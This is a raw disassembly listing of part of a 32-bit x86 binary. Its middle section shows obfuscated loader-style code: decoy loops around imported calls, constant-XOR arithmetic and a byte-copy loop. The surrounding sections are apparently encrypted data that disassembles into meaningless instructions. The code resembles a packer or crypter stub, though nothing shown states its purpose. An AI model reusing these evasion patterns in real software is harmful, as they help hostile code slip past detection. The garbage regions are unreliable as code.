  403a1c:	mov    ebp,0xa1fb2dca
  403a21:	icebp  
  403a22:	xor    ch,bl
  403a24:	fdivr  st,st(0)
  403a26:	push   ecx
  403a27:	and    eax,0x904df042
  403a2c:	mov    ds:0x6fa1ae98,al
  403a31:	hlt    
  403a32:	mov    BYTE PTR cs:[eax+0x56],0x63
  403a37:	cmp    al,ah
  403a39:	add    BYTE PTR [edx-0x41],dh
  403a3c:	fs xchg esp,eax
  403a3e:	push   ss
  403a3f:	xor    eax,0xf0b502f1
  403a44:	add    al,0x4d
  403a46:	fnstenv [edx-0x6dd80822]
  403a4c:	jbe    0x4039fb
  403a4e:	jmp    0xb63e71fb
  403a53:	xchg   edx,eax
  403a54:	inc    esi
  403a55:	jg     0x403a12
  403a57:	sbb    DWORD PTR [ebx-0x5ff9ad28],esi
  403a5d:	imul   esi,ebp,0x70
  403a60:	out    dx,eax
  403a61:	leave  
  403a62:	out    0x4,al
  403a64:	sbb    al,0xa6
  403a66:	int    0xc4
  403a68:	cmp    DWORD PTR [esp+ebx*1-0x453c62f6],eax
  403a6f:	cmp    eax,0xec46c3ee
  403a74:	push   edi
  403a75:	addr16 ja 0x403adb
  403a78:	push   esi
  403a79:	mov    ds:0x5f6bc5b5,eax
  403a7e:	pop    ebx
  403a7f:	pop    ds
  403a80:	retf   0x5a79
  403a83:	dec    ecx
  403a84:	inc    edi
  403a85:	sti    
  403a86:	jle    0x403ab8
  403a88:	sbb    al,0xf5
  403a8a:	sti    
  403a8b:	sbb    al,0x29
  403a8d:	add    BYTE PTR [ecx-0x15d1c5c7],0xb5
  403a94:	out    0xd0,al
  403a96:	push   0x519971aa
  403a9b:	jno    0x403a5b
  403a9d:	outs   dx,DWORD PTR ds:[esi]
  403a9e:	or     BYTE PTR [edx-0x6cb6a80b],dh
  403aa4:	and    BYTE PTR [esi+ecx*2-0x7049f74a],dl
  403aab:	shl    DWORD PTR [ebx+0x7a41dab7],cl
  403ab1:	stc    
  403ab2:	fcmovne st,st(0)
  403ab4:	sub    eax,0xf05ab1be
  403ab9:	call   0x46e61b5c
  403abe:	cmp    DWORD PTR [ecx],ebp
  403ac0:	xchg   edx,eax
  403ac1:	daa    
  403ac2:	and    ah,BYTE PTR [edi+0x1e]
  403ac5:	fsubr  DWORD PTR [ecx+0x60]
  403ac8:	rcr    cl,0x6b
  403acb:	mov    bl,0xf6
  403acd:	cmp    al,dl
  403acf:	loope  0x403acb
  403ad1:	cmp    eax,DWORD PTR [edx-0x6df04e15]
  403ad7:	cli    
  403ad8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ad9:	dec    ebp
  403ada:	pop    eax
  403adb:	sub    BYTE PTR [ebp+0x7284f5df],0xf4
  403ae2:	inc    ebx
  403ae3:	and    BYTE PTR [edi+eax*1-0x1d],0x43
  403ae8:	(bad)  
  403ae9:	aad    0x8b
  403aeb:	pop    ebp
  403aec:	mov    eax,ds:0x399e2d47
  403af1:	gs pop ebx
  403af3:	test   al,0x22
  403af5:	sub    BYTE PTR [esi],bl
  403af7:	sbb    al,0xaa
  403af9:	mov    ecx,0x66b52107
  403afe:	push   0xbbbbd6c3
  403b03:	cmp    DWORD PTR [eax],0xe98c45ed
  403b09:	(bad)  
  403b0a:	xor    DWORD PTR [ebp+0x237d6ddc],edi
  403b10:	mov    dh,0xef
  403b12:	push   ecx
  403b13:	dec    edi
  403b14:	jmp    0x403b95
  403b16:	jmp    0x5e7a9874
  403b1b:	stc    
  403b1c:	arpl   WORD PTR [esp+ebp*2],cx
  403b1f:	sbb    ch,BYTE PTR [eax+0x6376d89a]
  403b25:	mov    ebp,0x59921720
  403b2a:	rcl    BYTE PTR [ecx+edi*4-0x7205b1c2],1
  403b31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b32:	cmp    bh,0x28
  403b35:	stos   BYTE PTR es:[edi],al
  403b36:	(bad)  
  403b37:	out    dx,al
  403b38:	mov    dl,0x5e
  403b3a:	loopne 0x403b5b
  403b3c:	scas   eax,DWORD PTR es:[edi]
  403b3d:	mov    esi,0xc55e349b
  403b42:	mov    ah,0xa9
  403b44:	cdq    
  403b45:	ins    BYTE PTR es:[edi],dx
  403b46:	mov    ds:0x8b83da3b,al
  403b4b:	jmp    0x514af6dc
  403b50:	add    cl,BYTE PTR [ebx-0x8]
  403b53:	in     eax,dx
  403b54:	xlat   BYTE PTR ds:[ebx]
  403b55:	cmp    eax,0x95ba51e2
  403b5a:	add    BYTE PTR [eax],dh
  403b5c:	imul   edx,DWORD PTR [esi],0x6d
  403b5f:	hlt    
  403b60:	in     eax,dx
  403b61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b62:	je     0x403b39
  403b64:	retf   0x84fa
  403b67:	cmp    eax,eax
  403b69:	lods   al,BYTE PTR ds:[esi]
  403b6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b6b:	enter  0x2c4e,0x39
  403b6f:	add    BYTE PTR [edx-0x4e481570],ch
  403b75:	mov    esi,DWORD PTR [edx+eiz*1]
  403b78:	out    0xa5,al
  403b7a:	xchg   ebx,eax
  403b7b:	aad    0x4f
  403b7d:	dec    DWORD PTR [eax+edx*1+0x24270d2b]
  403b84:	test   eax,0xa29acb07
  403b89:	repnz bound ebx,QWORD PTR [esi-0x76]
  403b8d:	xchg   DWORD PTR [ebx],edx
  403b8f:	xor    BYTE PTR [ebx+0xeb13674],bh
  403b95:	cli    
  403b96:	(bad)  
  403b97:	or     DWORD PTR [ebp-0x37],edi
  403b9a:	dec    esp
  403b9b:	sbb    DWORD PTR [ebx-0xc],edi
  403b9e:	in     al,dx
  403b9f:	mov    ds:0x7399e77f,eax
  403ba4:	sub    esp,DWORD PTR [edi+0xc2069c4]
  403baa:	xchg   ebp,ecx
  403bac:	adc    eax,0x35514c28
  403bb2:	sbb    al,BYTE PTR [ecx-0x6]
  403bb5:	adc    BYTE PTR [ebx+ebx*4-0x63dcd41d],dh
  403bbc:	loope  0x403b43
  403bbe:	pop    ebx
  403bbf:	enter  0x5a7c,0x6b
  403bc3:	mov    WORD PTR [eax],?
  403bc5:	(bad)  
  403bc6:	and    eax,0x2bfd98ab
  403bcb:	arpl   WORD PTR [edi+0x4a],cx
  403bce:	cli    
  403bcf:	inc    esp
  403bd0:	sbb    eax,0x37cb9696
  403bd5:	push   cs
  403bd6:	popa   
  403bd7:	lahf   
  403bd8:	cmc    
  403bd9:	scas   eax,DWORD PTR es:[edi]
  403bda:	gs jb  0x403c00
  403bdd:	jmp    0xe136:0x53fe1d02
  403be4:	pop    esp
  403be5:	pop    ss
  403be6:	arpl   di,ax
  403be8:	cmp    dh,BYTE PTR [eax+0x7cad3b6b]
  403bee:	imul   esp,edi,0xe710a883
  403bf4:	inc    esi
  403bf5:	or     dl,BYTE PTR [ecx-0x3e20bc20]
  403bfb:	outs   dx,DWORD PTR ds:[esi]
  403bfc:	push   cs
  403bfd:	aad    0xb0
  403bff:	push   edi
  403c00:	repnz mov esi,0x837ffaf3
  403c06:	xor    BYTE PTR ds:0xdd6f3ccf,ch
  403c0c:	stc    
  403c0d:	dec    eax
  403c0e:	(bad)  
  403c10:	les    ecx,FWORD PTR [edi]
  403c12:	and    bl,dl
  403c14:	push   ebx
  403c15:	jne    0x403c13
  403c17:	pop    edx
  403c18:	jl     0x403bcf
  403c1a:	adc    BYTE PTR [ecx-0x1ea79cf9],ah
  403c20:	outs   dx,DWORD PTR ds:[esi]
  403c21:	xchg   edx,eax
  403c22:	add    al,0xec
  403c24:	push   DWORD PTR [eax]
  403c26:	inc    esi
  403c27:	iret   
  403c28:	or     DWORD PTR [ecx+0x384c084c],0xffffffac
  403c2f:	xchg   DWORD PTR [ecx],ebp
  403c31:	int3   
  403c32:	or     BYTE PTR [ecx-0x45],0x62
  403c36:	mov    cl,BYTE PTR [edx-0x5252a0a0]
  403c3c:	cwde   
  403c3d:	fstp   TBYTE PTR [edi+eax*4+0x6e]
  403c41:	cmp    BYTE PTR [edi-0x2c],ah
  403c44:	push   ebp
  403c45:	jp     0x403cba
  403c47:	xor    eax,0x4c29e6de
  403c4c:	add    DWORD PTR [ecx],ebx
  403c4e:	cdq    
  403c4f:	js     0x403c63
  403c51:	push   ebp
  403c52:	in     al,dx
  403c53:	(bad)  
  403c54:	repnz rol BYTE PTR [eax+0x3915b998],0x42
  403c5c:	retf   
  403c5d:	and    DWORD PTR fs:[ebx-0x207875a6],0x62ba180c
  403c68:	fld    DWORD PTR [esi]
  403c6a:	mov    al,0xdd
  403c6c:	mov    ebp,0x59357797
  403c71:	mov    ebx,0x8f9ebc0a
  403c76:	(bad)  
  403c77:	cwde   
  403c78:	add    edi,DWORD PTR [ecx]
  403c7a:	or     eax,0x36770cb8
  403c7f:	and    dh,BYTE PTR [ebx]
  403c81:	enter  0x4d89,0x8
  403c85:	mov    ecx,DWORD PTR [ebp+0x8]
  403c88:	mov    edx,DWORD PTR [ebp+0x8]
  403c8b:	xor    ecx,eax
  403c8d:	imul   edx,edx,0x5708f5
  403c93:	add    ecx,esi
  403c95:	lea    ecx,[ebp+ecx*4-0x64]
  403c99:	mov    edi,DWORD PTR [ecx]
  403c9b:	add    edx,edi
  403c9d:	mov    DWORD PTR [ecx],edx
  403c9f:	mov    ecx,DWORD PTR [ebp+0x8]
  403ca2:	xor    ecx,eax
  403ca4:	add    ecx,esi
  403ca6:	jne    0x4018ed
  403cac:	mov    ecx,DWORD PTR [ebp-0x8]
  403caf:	xor    ecx,eax
  403cb1:	mov    eax,DWORD PTR [ebp+0x10]
  403cb4:	add    ecx,esi
  403cb6:	mov    DWORD PTR [eax],ecx
  403cb8:	pop    edi
  403cb9:	pop    esi
  403cba:	pop    ebx
  403cbb:	leave  
  403cbc:	ret    0xc
  403cbf:	push   ebp
  403cc0:	mov    ebp,esp
  403cc2:	mov    DWORD PTR ds:0x41d57c,0xf89c85b5
  403ccc:	pop    ebp
  403ccd:	mov    DWORD PTR ds:0x429000,0x2616
  403cd7:	jmp    0x41046f
  403cdc:	sbb    DWORD PTR ds:0x427018,edx
  403ce2:	mov    eax,0x80670b3f
  403ce7:	ret    
  403ce8:	push   ebp
  403ce9:	mov    ebp,esp
  403ceb:	sub    esp,0x10
  403cee:	mov    eax,0xf89c85b6
  403cf3:	mov    DWORD PTR ds:0x425004,0x1b
  403cfd:	cmp    DWORD PTR ds:0x425004,0x0
  403d04:	je     0x403d42
  403d0a:	cmp    DWORD PTR ds:0x425004,0x29
  403d11:	jne    0x403d26
  403d17:	push   DWORD PTR [ebp-0xc]
  403d1a:	push   DWORD PTR [ebp-0x1c]
  403d1d:	push   DWORD PTR [ebp-0x18]
  403d20:	call   DWORD PTR ds:0x421020
  403d26:	mov    edx,DWORD PTR ds:0x425004
  403d2c:	dec    edx
  403d2d:	mov    DWORD PTR ds:0x425004,edx
  403d33:	jmp    0x403cfd
  403d38:	xor    DWORD PTR ds:0x426018,0x7d7c
  403d42:	mov    DWORD PTR [ebp-0x4],eax
  403d45:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  403d4c:	and    DWORD PTR ds:0x428014,0x0
  403d56:	jmp    0x403d68
  403d5b:	mov    ecx,DWORD PTR ds:0x428014
  403d61:	inc    ecx
  403d62:	mov    DWORD PTR ds:0x428014,ecx
  403d68:	cmp    DWORD PTR ds:0x428014,0x1f
  403d6f:	jae    0x403db8
  403d75:	cmp    DWORD PTR ds:0x428014,0x4
  403d7c:	jne    0x403d93
  403d82:	push   DWORD PTR [ebp-0x18]
  403d85:	push   0x8961
  403d8a:	push   DWORD PTR [ebp-0x14]
  403d8d:	call   DWORD PTR ds:0x421028
  403d93:	cmp    DWORD PTR ds:0x428014,0x3
  403d9a:	jne    0x403dad
  403da0:	mov    ecx,DWORD PTR ds:0x428014
  403da6:	inc    ecx
  403da7:	mov    DWORD PTR ds:0x428014,ecx
  403dad:	jmp    0x403d5b
  403db2:	add    ecx,DWORD PTR ds:0x425000
  403db8:	mov    ecx,DWORD PTR [ebp-0x4]
  403dbb:	adc    DWORD PTR ds:0x426000,edi
  403dc1:	push   esi
  403dc2:	or     edx,esi
  403dc4:	mov    edx,0x7510893
  403dc9:	and    DWORD PTR ds:0x429014,0x0
  403dd3:	mov    esi,DWORD PTR ds:0x429014
  403dd9:	inc    esi
  403dda:	mov    DWORD PTR ds:0x429014,esi
  403de0:	cmp    DWORD PTR ds:0x429014,0x5
  403de7:	jne    0x403df8
  403ded:	push   0x41fedf
  403df2:	call   DWORD PTR ds:0x42102c
  403df8:	cmp    DWORD PTR ds:0x429014,0x4
  403dff:	jne    0x403e12
  403e05:	mov    esi,DWORD PTR ds:0x429014
  403e0b:	inc    esi
  403e0c:	mov    DWORD PTR ds:0x429014,esi
  403e12:	cmp    DWORD PTR ds:0x429014,0x15
  403e19:	jb     0x403dd3
  403e1f:	movzx  esi,BYTE PTR ds:0x429008
  403e26:	sub    DWORD PTR ds:0x42900c,esi
  403e2c:	xor    ecx,edx
  403e2e:	mov    esi,0x3272db
  403e33:	push   edi
  403e34:	sbb    edi,DWORD PTR ds:0x42601c
  403e3a:	mov    edi,DWORD PTR [ebp+0x10]
  403e3d:	add    ecx,esi
  403e3f:	mov    DWORD PTR ds:0x42700c,0x23cb
  403e49:	cmp    ecx,edi
  403e4b:	mov    DWORD PTR ds:0x425000,0x3f40
  403e55:	je     0x403f20
  403e5b:	mov    ecx,DWORD PTR [ebp-0x4]
  403e5e:	sub    edi,0x7e0f
  403e64:	mov    edi,DWORD PTR [ebp+0x10]
  403e67:	xor    eax,eax
  403e69:	xor    ecx,edx
  403e6b:	add    ecx,esi
  403e6d:	add    edi,0xfabdbef1
  403e73:	adc    eax,0xffffffff
  403e76:	xor    eax,0x0
  403e79:	mov    DWORD PTR [ebp-0xc],eax
  403e7c:	push   ebx
  403e7d:	xor    ebx,ebx
  403e7f:	xor    edi,0x8a29a123
  403e85:	mov    eax,ecx
  403e87:	add    eax,0xfabdbef1
  403e8c:	adc    ebx,0xffffffff
  403e8f:	xor    eax,0x8a29a123
  403e94:	xor    ebx,0x0
  403e97:	cmp    eax,edi
  403e99:	jne    0x403eb2
  403e9f:	cmp    ebx,DWORD PTR [ebp-0xc]
  403ea2:	je     0x403f1a
  403ea8:	jmp    0x403eb2
  403ead:	mov    esi,0x3272db
  403eb2:	mov    eax,DWORD PTR [ebp-0x4]
  403eb5:	mov    edi,DWORD PTR [ebp-0x8]
  403eb8:	xor    edi,edx
  403eba:	add    edi,esi
  403ebc:	mov    esi,DWORD PTR [ebp+0x8]
  403ebf:	imul   edi,ecx
  403ec2:	mov    ebx,DWORD PTR [ebp+0xc]
  403ec5:	xor    eax,edx
  403ec7:	add    eax,ecx
  403ec9:	mov    al,BYTE PTR [ebx+eax*1+0x3272db]
  403ed0:	mov    BYTE PTR [edi+esi*1],al
  403ed3:	mov    eax,DWORD PTR [ebp-0x8]
  403ed6:	mov    esi,DWORD PTR [ebp+0x10]
  403ed9:	xor    eax,edx
  403edb:	xor    ebx,ebx
  403edd:	add    esi,0xfabdbef1
  403ee3:	adc    ebx,0xffffffff
  403ee6:	lea    ecx,[ecx+eax*1+0x3272db]
  403eed:	xor    edi,edi
  403eef:	xor    esi,0x8a29a123
  403ef5:	xor    ebx,0x0
  403ef8:	mov    eax,ecx
  403efa:	add    eax,0xfabdbef1
  403eff:	adc    edi,0xffffffff
  403f02:	xor    eax,0x8a29a123
  403f07:	xor    edi,0x0
  403f0a:	cmp    eax,esi
  403f0c:	jne    0x403ead
  403f12:	cmp    edi,ebx
  403f14:	jne    0x403ead
  403f1a:	mov    eax,0xf89c85b5
  403f1f:	pop    ebx
  403f20:	pop    edi
  403f21:	pop    esi
  403f22:	leave  
  403f23:	ret    0xc
  403f26:	push   ebp
  403f27:	mov    ebp,esp
  403f29:	sub    esp,0x78
  403f2c:	adc    DWORD PTR ds:0x42601c,0x7e2b
  403f36:	push   ebx
  403f37:	push   esi
  403f38:	push   edi
  403f39:	push   0x1f
  403f3b:	sub    DWORD PTR ds:0x42601c,0x56d8
  403f45:	lea    eax,[ebp-0x78]
  403f48:	sbb    DWORD PTR ds:0x42801c,0x71f8
  403f52:	push   eax
  403f53:	add    DWORD PTR ds:0x429018,0x427000
  403f5d:	push   0x0
  403f5f:	sub    DWORD PTR ds:0x42501c,0x427004
  403f69:	call   DWORD PTR ds:0x421044
  403f6f:	push   0x97898797
  403f74:	and    DWORD PTR ds:0x426000,0x1a8d
  403f7e:	call   DWORD PTR ds:0x421010
  403f84:	and    DWORD PTR ds:0x42600c,0x0
  403f8e:	mov    ecx,DWORD PTR ds:0x42600c
  403f94:	inc    ecx
  403f95:	mov    DWORD PTR ds:0x42600c,ecx
  403f9b:	cmp    DWORD PTR ds:0x42600c,0x21
  403fa2:	jne    0x403fda
  403fa8:	push   0x67f5
  403fad:	push   0x706e
  403fb2:	push   DWORD PTR [ebp-0x1c]
  403fb5:	push   0x21f9
  403fba:	push   DWORD PTR [ebp-0x24]
  403fbd:	push   0x372d
  403fc2:	push   DWORD PTR [ebp-0x1c]
  403fc5:	push   0x6932
  403fca:	push   0x2439
  403fcf:	push   0x1248
  403fd4:	call   DWORD PTR ds:0x421030
  403fda:	cmp    DWORD PTR ds:0x42600c,0x1d
  403fe1:	jb     0x403f8e
  403fe7:	add    DWORD PTR ds:0x428010,ebx
  403fed:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  403ff4:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  403ffb:	or     DWORD PTR ds:0x42701c,0x426014
  404005:	mov    ecx,DWORD PTR [ebp-0x4]
  404008:	adc    eax,0xdaa
  40400d:	mov    ebx,0x7510893
  404012:	xor    DWORD PTR ds:0x427004,ebx
  404018:	xor    ecx,ebx
  40401a:	mov    eax,0x3272db
  40401f:	add    ecx,eax
  404021:	mov    DWORD PTR [ebp-0x1c],ecx
  404024:	and    DWORD PTR ds:0x428010,0x0
  40402e:	jmp    0x404040
  404033:	mov    ecx,DWORD PTR ds:0x428010
  404039:	inc    ecx
  40403a:	mov    DWORD PTR ds:0x428010,ecx
  404040:	cmp    DWORD PTR ds:0x428010,0x18
  404047:	jae    0x40406f
  40404d:	cmp    DWORD PTR ds:0x428010,0x20
  404054:	jne    0x40406a
  40405a:	push   0x42801c
  40405f:	push   0x7111
  404064:	call   DWORD PTR ds:0x421058
  40406a:	jmp    0x404033
  40406f:	mov    ecx,DWORD PTR [ebp+0x14]
  404072:	adc    DWORD PTR ds:0x426004,0x3b44
  40407c:	test   ecx,ecx
  40407e:	mov    DWORD PTR ds:0x425024,0xafb
  404088:	je     0x404096
  40408e:	mov    ecx,DWORD PTR [ebp+0x14]
  404091:	mov    ecx,DWORD PTR [ecx]
  404093:	mov    DWORD PTR [ebp-0x1c],ecx
  404096:	mov    ecx,0x7665
  40409b:	imul   edx,eax
  40409e:	or     DWORD PTR ds:0x429000,0x5016
  4040a8:	mov    esi,0x76532
  4040ad:	sbb    DWORD PTR ds:0x429008,0x6d64
  4040b7:	add    edx,ecx
  4040b9:	xchg   esi,ecx
  4040bb:	or     esi,DWORD PTR ds:0x427010
  4040c1:	mov    edi,0x54354
  4040c6:	sub    edx,edi
  4040c8:	xor    DWORD PTR ds:0x42600c,edi
  4040ce:	mov    ecx,DWORD PTR [ebp-0x4]
  4040d1:	xor    DWORD PTR ds:0x425008,0x2961
  4040db:	xor    ecx,ebx
  4040dd:	mov    DWORD PTR ds:0x42601c,0x16
  4040e7:	cmp    DWORD PTR ds:0x42601c,0x0
  4040ee:	je     0x404130
  4040f4:	cmp    DWORD PTR ds:0x42601c,0x1d
  4040fb:	jne    0x404114
  404101:	push   0x425014
  404106:	push   0x426014
  40410b:	push   DWORD PTR [ebp-0x28]
  40410e:	call   DWORD PTR ds:0x42105c
  404114:	mov    esi,DWORD PTR ds:0x42601c
  40411a:	dec    esi
  40411b:	mov    DWORD PTR ds:0x42601c,esi
  404121:	jmp    0x4040e7
  404126:	sbb    DWORD PTR ds:0x425014,0x65a5
  404130:	add    ecx,eax
  404132:	mov    esi,DWORD PTR ds:0x425008
  404138:	sbb    DWORD PTR ds:0x426008,esi
  40413e:	mov    DWORD PTR [ebp-0x8],ecx
  404141:	sub    DWORD PTR ds:0x428010,edx
  404147:	mov    ecx,DWORD PTR [ebp-0x14]
  40414a:	mov    DWORD PTR ds:0x428008,0x2441
  404154:	xor    ecx,ebx
  404156:	add    ecx,eax
  404158:	mov    DWORD PTR [ebp-0x24],ecx
  40415b:	mov    ecx,DWORD PTR ds:0x42801c
  404161:	sbb    DWORD PTR ds:0x429004,ecx
  404167:	mov    ecx,DWORD PTR [ebp-0x4]
  40416a:	xor    ecx,ebx
  40416c:	mov    DWORD PTR ds:0x426000,0x1b
  404176:	cmp    DWORD PTR ds:0x426000,0x0
  40417d:	je     0x4041b9
  404183:	cmp    DWORD PTR ds:0x426000,0x22
  40418a:	jne    0x4041a3
  404190:	push   0x561f
  404195:	push   0x425014
  40419a:	push   DWORD PTR [ebp-0xc]
  40419d:	call   DWORD PTR ds:0x421034
  4041a3:	xor    esi,esi
  4041a5:	add    esi,DWORD PTR ds:0x426000
  4041ab:	dec    esi
  4041ac:	mov    DWORD PTR ds:0x426000,esi
  4041b2:	jmp    0x404176
  4041b7:	neg    esi
  4041b9:	add    ecx,eax
  4041bb:	adc    DWORD PTR ds:0x425014,edi
  4041c1:	mov    DWORD PTR [ebp-0x30],ecx
  4041c4:	or     DWORD PTR ds:0x426000,0x760b
  4041ce:	mov    esi,DWORD PTR [ebp-0x4]
  4041d1:	and    DWORD PTR ds:0x42700c,0x0
  4041db:	mov    ecx,DWORD PTR ds:0x42700c
  4041e1:	inc    ecx
  4041e2:	mov    DWORD PTR ds:0x42700c,ecx
  4041e8:	cmp    DWORD PTR ds:0x42700c,0x1f
  4041ef:	jne    0x404203
  4041f5:	push   DWORD PTR [ebp-0xc]
  4041f8:	push   0x7ec8
  4041fd:	call   DWORD PTR ds:0x421038
  404203:	cmp    DWORD PTR ds:0x42700c,0x13
  40420a:	jb     0x4041db
  404210:	xor    esi,ebx
  404212:	mov    DWORD PTR ds:0x426018,0x19
  40421c:	cmp    DWORD PTR ds:0x426018,0x0
  404223:	je     0x40427d
  404229:	cmp    DWORD PTR ds:0x426018,0xc
  404230:	jne    0x404251
  404236:	push   DWORD PTR [ebp-0x24]
  404239:	push   0x1686
  40423e:	push   0x428008
  404243:	push   DWORD PTR [ebp-0x28]
  404246:	push   0x2eb1
  40424b:	call   DWORD PTR ds:0x421000
  404251:	cmp    DWORD PTR ds:0x426018,0xd
  404258:	jne    0x40426b
  40425e:	mov    ecx,DWORD PTR ds:0x426018
  404264:	dec    ecx
  404265:	mov    DWORD PTR ds:0x426018,ecx
  40426b:	mov    ecx,DWORD PTR ds:0x426018
  404271:	dec    ecx
  404272:	mov    DWORD PTR ds:0x426018,ecx
  404278:	jmp    0x40421c
  40427d:	add    esi,eax
  40427f:	sub    DWORD PTR ds:0x428008,edx
  404285:	mov    ecx,DWORD PTR [ebp-0x24]
  404288:	or     DWORD PTR ds:0x429008,0x427008
  404292:	sub    ecx,eax
  404294:	jmp    0x4065e9
  404299:	div    ecx
  40429b:	and    DWORD PTR [edi+eax*1+0x64],edx
  40429f:	xchg   ebx,eax
  4042a0:	lods   eax,DWORD PTR ds:[esi]
  4042a1:	mov    edx,0xea9c947b
  4042a6:	jecxz  0x40425e
  4042a8:	daa    
  4042a9:	sbb    bl,BYTE PTR [edi+0x62]
  4042ac:	bound  ebp,QWORD PTR [edx]
  4042ae:	pop    edi
  4042af:	bound  esp,QWORD PTR [edx+0x59]
  4042b2:	mul    DWORD PTR [edx-0x518ce9db]
  4042b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042b9:	mov    esi,0x586d932d
  4042be:	cmc    
  4042bf:	add    DWORD PTR [esi-0xd],ebp
  4042c2:	mov    al,ds:0xe848c05f
  4042c7:	sar    BYTE PTR [edi+0x7b],1
  4042ca:	lods   eax,DWORD PTR ds:[esi]
  4042cb:	fisub  WORD PTR [ebx-0x76]
  4042ce:	in     eax,0x7
  4042d0:	ror    BYTE PTR [edi-0x68],1
  4042d3:	pop    ds
  4042d4:	call   0x30d:0x4aa30ff4
  4042db:	add    eax,0xe1dba467
  4042e0:	out    dx,al
  4042e1:	push   ecx
  4042e2:	xchg   edx,eax
  4042e3:	scas   al,BYTE PTR es:[edi]
  4042e4:	jns    0x404362
  4042e6:	mov    edx,0x3ecd65e8
  4042eb:	and    al,0xa3
  4042ed:	dec    ecx
  4042ee:	lods   eax,DWORD PTR ds:[esi]
  4042ef:	outs   dx,BYTE PTR ds:[esi]
  4042f0:	ret    
  4042f1:	xchg   esi,eax
  4042f2:	xor    BYTE PTR [ebp-0x4e875ff4],al
  4042f8:	push   eax
  4042f9:	push   eax
  4042fa:	sbb    BYTE PTR [edx],0xa1
  4042fd:	xchg   edi,eax
  4042fe:	test   BYTE PTR [ebx-0x80],dl
  404301:	test   BYTE PTR [eax+0x38],ah
  404304:	ror    edx,1
  404306:	ins    DWORD PTR es:[edi],dx
  404307:	sub    BYTE PTR [eax+eiz*4],ah
  40430a:	mov    DWORD PTR [ecx+0x7c],ebp
  40430d:	dec    eax
  40430e:	(bad)  
  40430f:	adc    edx,edx
  404311:	stos   BYTE PTR es:[edi],al
  404312:	sub    BYTE PTR [ecx],dh
  404314:	inc    edi
  404315:	mov    edi,0x4c1fb38
  40431a:	jg     0x4042f9
  40431c:	das    
  40431d:	fwait
  40431e:	dec    ecx
  40431f:	cmp    DWORD PTR [edi+0xd],edx
  404322:	pop    ebx
  404323:	repz mov al,0x2d
  404326:	mov    dl,0x6b
  404328:	out    0xb,al
  40432a:	das    
  40432b:	jecxz  0x4042c7
  40432d:	inc    ebp
  40432e:	push   cs
  40432f:	and    DWORD PTR [ebx+0x26],edi
  404332:	pushf  
  404333:	adc    eax,0xa65f2591
  404338:	retf   0xf6fd
  40433b:	pop    esi
  40433c:	jecxz  0x404361
  40433e:	std    
  40433f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404340:	int    0x4a
  404342:	add    al,0xc7
  404344:	stc    
  404345:	push   ds
  404346:	jecxz  0x4043b9
  404348:	jmp    0x404380
  40434a:	fnsave [ebx+0x33d259db]
  404350:	stos   DWORD PTR es:[edi],eax
  404351:	cmp    al,0x6a
  404353:	jmp    0xd00a:0x7ab2ff10
  40435a:	jecxz  0x4042fc
  40435c:	shl    DWORD PTR [edx+edx*8],0x1
  404360:	mov    al,dl
  404362:	jl     0x404327
  404364:	sbb    DWORD PTR [eax+esi*1-0x14],0x8ae41c8a
  40436c:	dec    esi
  40436d:	cwde   
  40436e:	and    dh,BYTE PTR [eax]
  404370:	popf   
  404371:	daa    
  404372:	mov    dl,0x2
  404374:	(bad)  [ebp-0x69babaae]
  40437a:	js     0x40438b
  40437c:	(bad)  
  40437d:	loopne 0x4043d9
  40437f:	inc    ecx
  404380:	sbb    ebx,eax
  404382:	jecxz  0x4043a5
  404384:	sub    al,0x79
  404386:	leave  
  404387:	inc    eax
  404388:	aam    0x35
  40438a:	daa    
  40438b:	ret    
  40438c:	pop    edx
  40438d:	pushf  
  40438e:	dec    eax
  40438f:	pop    ecx
  404390:	dec    esi
  404391:	nop
  404392:	cwde   
  404393:	ss (bad) 
  404396:	stc    
  404397:	adc    eax,DWORD PTR [ebp-0x30]
  40439a:	(bad)  
  40439b:	pop    eax
  40439c:	jl     0x4043a1
  40439e:	lods   eax,DWORD PTR ds:[esi]
  40439f:	push   0xa3171a8d
  4043a4:	mov    al,BYTE PTR [ebp-0xc]
  4043a7:	or     ebp,DWORD PTR [eax-0x39]
  4043aa:	sub    ch,BYTE PTR [ebp-0x2594598b]
  4043b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043b1:	retf   0x792d
  4043b4:	inc    edx
  4043b5:	sbb    DWORD PTR [esi-0x59],esp
  4043b8:	fsubr  QWORD PTR [ecx+0x64]
  4043bb:	je     0x404416
  4043bd:	outs   dx,BYTE PTR ds:[esi]
  4043be:	mov    DWORD PTR [ebx+0x2b17403f],ebp
  4043c4:	xor    BYTE PTR [edx],dl
  4043c6:	popa   
  4043c7:	pop    esp
  4043c8:	fisttp QWORD PTR [esi+0x7e7d2a9c]
  4043ce:	mov    ecx,0x30d699b4
  4043d3:	mov    ecx,0xf225a015
  4043d8:	je     0x404454
  4043da:	cmp    al,0x3b
  4043dc:	adc    cl,BYTE PTR [ecx]
  4043de:	(bad)  
  4043df:	or     al,0xc7
  4043e1:	outs   dx,BYTE PTR ds:[esi]
  4043e2:	sbb    eax,DWORD PTR [ecx+0x56a221ce]
  4043e8:	pop    eax
  4043e9:	xchg   ecx,eax
  4043ea:	int    0xbb
  4043ec:	fcom   st(4)
  4043ee:	out    dx,al
  4043ef:	add    BYTE PTR [edi+ebp*2],bh
  4043f2:	inc    ebp
  4043f3:	push   ss
  4043f4:	out    0x59,al
  4043f6:	push   ss
  4043f7:	adc    BYTE PTR [edi],0x8a
  4043fa:	xchg   esp,eax
  4043fb:	jecxz  0x40443f
  4043fd:	ds add edx,esi
  404400:	ss fs inc esp
  404403:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404404:	rcr    DWORD PTR [ecx-0x176a6278],cl
  40440a:	jae    0x4043d0
  40440c:	sbb    eax,0x989acb5f
  404411:	jae    0x404410
  404413:	push   0x45
  404415:	cdq    
  404416:	add    BYTE PTR [ecx],dl
  404418:	mov    edx,0x2ac4fbf8
  40441d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40441e:	aaa    
  40441f:	fnstcw WORD PTR [ebp+ebp*4+0x161fca9c]
